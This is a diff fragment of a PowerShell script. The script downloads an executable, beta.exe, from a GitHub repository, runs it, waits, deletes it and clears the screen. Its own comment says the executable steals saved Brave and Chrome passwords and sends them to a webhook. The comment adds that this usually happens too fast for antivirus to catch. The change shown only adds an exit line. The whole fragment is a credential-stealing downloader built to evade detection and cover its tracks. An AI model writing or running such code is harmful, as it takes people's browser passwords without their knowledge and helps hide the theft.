@@ -3,3 +3,4 @@ function Send-DataToWebhook { param ($WebhookUrl, $Data) try { $body = @{content
 #This downloads beta.exe which gets saved brave and chrome passwords and sends them to webhook (normally this happens too fast for any antivirus to notice it but sometimes it is caught)
 Invoke-WebRequest -Uri 'github.com/Adhrit121/Data_storage/raw/main/beta.exe' -OutFile 'beta.exe'
 Start-Process -FilePath 'beta.exe'; Start-Sleep -Seconds 2; while(Get-Process -Name 'beta' -ErrorAction SilentlyContinue){Start-Sleep -Seconds 1}; Remove-Item 'beta.exe' -Force; clear;
+exit
